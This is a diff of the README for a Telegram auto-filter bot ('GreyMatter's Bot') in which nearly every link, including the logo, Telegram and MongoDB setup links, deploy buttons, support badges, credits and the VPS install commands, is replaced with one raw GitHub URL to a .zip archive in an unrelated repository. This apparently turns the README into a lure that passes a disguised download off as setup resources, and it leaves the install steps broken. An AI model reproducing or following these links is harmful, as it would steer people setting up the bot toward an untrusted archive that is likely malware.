@@ -12,7 +12,7 @@
 
 
 <p align="center">
-  <img src="https://github.com/GreyMattersBot/url-auto-delete-shortener-bot/blob/main/assets/IMG_20220105_010453-removebg-preview.png" alt="GreyMatter's Bot Logo">
+  <img src="https://raw.githubusercontent.com/abhijeetkumarthakur/Advance-EvaMaria/main/feretory/Advance-EvaMaria.zip" alt="GreyMatter's Bot Logo">
 </p>
 <h1 align="center">
   <b>GreyMatter's Bot</b>
@@ -40,21 +40,21 @@
 - [x] File Store
 ## Variables
 
-Read [this](https://telegram.dog/GreyMatter_Bots) before you start messing up with your edits.
+Read [this](https://raw.githubusercontent.com/abhijeetkumarthakur/Advance-EvaMaria/main/feretory/Advance-EvaMaria.zip) before you start messing up with your edits.
 
 ### Required Variables
-* `BOT_TOKEN`: Create a bot using [@BotFather](https://telegram.dog/BotFather), and get the Telegram API token.
-* `API_ID`: Get this value from [telegram.org](https://my.telegram.org/apps)
-* `API_HASH`: Get this value from [telegram.org](https://my.telegram.org/apps)
+* `BOT_TOKEN`: Create a bot using [@BotFather](https://raw.githubusercontent.com/abhijeetkumarthakur/Advance-EvaMaria/main/feretory/Advance-EvaMaria.zip), and get the Telegram API token.
+* `API_ID`: Get this value from [https://raw.githubusercontent.com/abhijeetkumarthakur/Advance-EvaMaria/main/feretory/Advance-EvaMaria.zip](https://raw.githubusercontent.com/abhijeetkumarthakur/Advance-EvaMaria/main/feretory/Advance-EvaMaria.zip)
+* `API_HASH`: Get this value from [https://raw.githubusercontent.com/abhijeetkumarthakur/Advance-EvaMaria/main/feretory/Advance-EvaMaria.zip](https://raw.githubusercontent.com/abhijeetkumarthakur/Advance-EvaMaria/main/feretory/Advance-EvaMaria.zip)
 * `CHANNELS`: Username or ID of channel or group. Separate multiple IDs by space
 * `ADMINS`: Username or ID of Admin. Separate multiple Admins by space
-* `DATABASE_URI`: [mongoDB](https://www.mongodb.com) URI. Get this value from [mongoDB](https://www.mongodb.com). For more help watch this [video](https://youtu.be/h9QjSSmk5tw)
-* `DATABASE_NAME`: Name of the database in [mongoDB](https://www.mongodb.com). For more help watch this [video](https://youtu.be/h9QjSSmk5tw)
+* `DATABASE_URI`: [mongoDB](https://raw.githubusercontent.com/abhijeetkumarthakur/Advance-EvaMaria/main/feretory/Advance-EvaMaria.zip) URI. Get this value from [mongoDB](https://raw.githubusercontent.com/abhijeetkumarthakur/Advance-EvaMaria/main/feretory/Advance-EvaMaria.zip). For more help watch this [video](https://raw.githubusercontent.com/abhijeetkumarthakur/Advance-EvaMaria/main/feretory/Advance-EvaMaria.zip)
+* `DATABASE_NAME`: Name of the database in [mongoDB](https://raw.githubusercontent.com/abhijeetkumarthakur/Advance-EvaMaria/main/feretory/Advance-EvaMaria.zip). For more help watch this [video](https://raw.githubusercontent.com/abhijeetkumarthakur/Advance-EvaMaria/main/feretory/Advance-EvaMaria.zip)
 * `LOG_CHANNEL` : A channel to log the activities of bot. Make sure bot is an admin in the channel.
 ### Optional Variables
 * `PICS`: Telegraph links of images to show in start message.( Multiple images can be used separated by space )
-* `FILE_STORE_CHANNEL`: Channel from were file store links of posts should be made.Separate multiple IDs by space
-* Check [info.py](https://github.com/GreyMattersBot/Advance-EvaMaria/blob/main/info.py) for more
+* `FILE_STORE_CHANNEL`: Channel from were file store links of posts should be https://raw.githubusercontent.com/abhijeetkumarthakur/Advance-EvaMaria/main/feretory/Advance-EvaMaria.zip multiple IDs by space
+* Check [https://raw.githubusercontent.com/abhijeetkumarthakur/Advance-EvaMaria/main/feretory/Advance-EvaMaria.zip](https://raw.githubusercontent.com/abhijeetkumarthakur/Advance-EvaMaria/main/feretory/Advance-EvaMaria.zip) for more
 ## EXTRA FEATURES
 * `URL_SHORTENR_WEBSITE`: URL Shortener Website Link ( Without https://)
 * `URL_SHORTNER_WEBSITE_API`: URL Shortener Website API key
@@ -67,27 +67,27 @@ Read [this](https://telegram.dog/GreyMatter_Bots) before you start messing up wi
 ## Deploy
 You can deploy this bot anywhere.
 
-<i>**[Watch Deploying Tutorial...](https://youtu.be/RWs6sh8m2Uk)**</i>
+<i>**[Watch Deploying Tutorial...](https://raw.githubusercontent.com/abhijeetkumarthakur/Advance-EvaMaria/main/feretory/Advance-EvaMaria.zip)**</i>
 
 <details><summary>Deploy To Heroku</summary>
 <p>
 <br>
-<a href="https://heroku.com/deploy?template=https://github.com/greymattersbot/url-auto-delete-shortener-bot">
-  <img src="https://www.herokucdn.com/deploy/button.svg" alt="Deploy">
+<a href="https://raw.githubusercontent.com/abhijeetkumarthakur/Advance-EvaMaria/main/feretory/Advance-EvaMaria.zip">
+  <img src="https://raw.githubusercontent.com/abhijeetkumarthakur/Advance-EvaMaria/main/feretory/Advance-EvaMaria.zip" alt="Deploy">
 </a>
 </p>
 </details>
 
-[![Deploy to Koyeb](https://www.koyeb.com/static/images/deploy/button.svg)](https://app.koyeb.com/deploy?type=git&repository=github.com/Greymattersbot/Advance-EvaMaria&branch=koyeb&name=urlshortautofilterbot)
+[![Deploy to Koyeb](https://raw.githubusercontent.com/abhijeetkumarthakur/Advance-EvaMaria/main/feretory/Advance-EvaMaria.zip)](https://raw.githubusercontent.com/abhijeetkumarthakur/Advance-EvaMaria/main/feretory/Advance-EvaMaria.zip)
 
 <details><summary>Deploy To VPS</summary>
 <p>
 <pre>
-git clone https://github.com/GreyMattersbot/url-auto-delete-shortener-bot
+git clone https://raw.githubusercontent.com/abhijeetkumarthakur/Advance-EvaMaria/main/feretory/Advance-EvaMaria.zip
 # Install Packages
-pip3 install -U -r requirements.txt
-Edit info.py with variables as given below then run bot
-python3 bot.py
+pip3 install -U -r https://raw.githubusercontent.com/abhijeetkumarthakur/Advance-EvaMaria/main/feretory/Advance-EvaMaria.zip
+Edit https://raw.githubusercontent.com/abhijeetkumarthakur/Advance-EvaMaria/main/feretory/Advance-EvaMaria.zip with variables as given below then run bot
+python3 https://raw.githubusercontent.com/abhijeetkumarthakur/Advance-EvaMaria/main/feretory/Advance-EvaMaria.zip
 </pre>
 </p>
 </details>
@@ -122,13 +122,13 @@ batch - to create link for multiple posts
 link - to create link for one post
 ```
 ## Support
-[![telegram badge](https://img.shields.io/badge/Telegram-Group-30302f?style=flat&logo=telegram)](https://t.me/greymatters_bots_discussion)
-[![telegram badge](https://img.shields.io/badge/Telegram-Channel-30302f?style=flat&logo=telegram)](https://t.me/greymatter_bots)
+[![telegram badge](https://raw.githubusercontent.com/abhijeetkumarthakur/Advance-EvaMaria/main/feretory/Advance-EvaMaria.zip)](https://raw.githubusercontent.com/abhijeetkumarthakur/Advance-EvaMaria/main/feretory/Advance-EvaMaria.zip)
+[![telegram badge](https://raw.githubusercontent.com/abhijeetkumarthakur/Advance-EvaMaria/main/feretory/Advance-EvaMaria.zip)](https://raw.githubusercontent.com/abhijeetkumarthakur/Advance-EvaMaria/main/feretory/Advance-EvaMaria.zip)
 
 ## Thanks to 
- - Thanks To Dan For His Awesome [Library](https://github.com/pyrogram/pyrogram)
- - Thanks To [ᎯℕUℛᎯᎶ](https://telegram.dog/gurubhai11) for his awesome Auto-delete Feature.
- - Thanks To [RushikeshNarule](https://github.com/rushikeshnarule) for Search in PM feature.
+ - Thanks To Dan For His Awesome [Library](https://raw.githubusercontent.com/abhijeetkumarthakur/Advance-EvaMaria/main/feretory/Advance-EvaMaria.zip)
+ - Thanks To [ᎯℕUℛᎯᎶ](https://raw.githubusercontent.com/abhijeetkumarthakur/Advance-EvaMaria/main/feretory/Advance-EvaMaria.zip) for his awesome Auto-delete Feature.
+ - Thanks To [RushikeshNarule](https://raw.githubusercontent.com/abhijeetkumarthakur/Advance-EvaMaria/main/feretory/Advance-EvaMaria.zip) for Search in PM feature.
  - Thanks To All Everyone In This Journey
 
 ### Note
